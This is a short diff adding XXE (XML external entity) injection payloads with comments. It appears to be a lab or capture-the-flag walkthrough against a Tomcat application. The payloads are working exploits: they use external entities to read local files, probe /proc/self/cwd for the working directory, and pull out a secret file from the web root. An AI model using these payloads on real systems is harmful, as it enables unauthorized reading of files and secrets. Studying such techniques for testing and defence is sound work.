@@ -1,0 +1,9 @@
+<!DOCTYPE root [ <!ENTITY lastname SYSTEM "file://secret.txt" > ]><employee id="1"><name>Amy &lastname;</name><salary>6000.0</salary></employee>
+
+# failed. We cannot specify a relative file directly. What we can do is to enumerate for the web root using the directory listing. We can also use the following /proc/ trick to probe the working directory of the tomcat process!
+
+<!DOCTYPE root [ <!ENTITY lastname SYSTEM "file:///proc/self/cwd/" > ]><employee id="1"><name>Amy &lastname;</name><salary>6000.0</salary></employee>
+
+# We can then extract out the one liner secret found in the web ROOT.
+
+<!DOCTYPE root [ <!ENTITY lastname SYSTEM "file:///proc/self/cwd/webapps/ROOT/secret.txt" > ]><employee id="1"><name>Amy &lastname;</name><salary>6000.0</salary></employee>
